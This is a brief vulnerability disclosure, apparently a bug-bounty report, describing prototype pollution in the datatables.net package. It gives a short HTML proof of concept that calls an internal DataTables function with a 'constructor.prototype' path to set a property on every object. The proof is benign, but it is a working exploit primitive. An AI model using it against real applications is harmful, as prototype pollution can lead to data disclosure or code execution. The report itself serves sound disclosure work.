# Description

`datatables.net` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

The following two files are required to be served by an HTTP server.

poc.html:
<script src="https://code.jquery.com/jquery-3.5.1.js"></script>
<script src="jquery.dataTables.js"></script>
<script>
    $.fn.dataTable.ext.internal._fnSetObjectDataFn('constructor.prototype.foo')({},'polluted');
    document.write('foo : ' + foo);
</script>

jquery.dataTables.js:
https://github.com/DataTables/Dist-DataTables/blob/master/js/jquery.dataTables.js
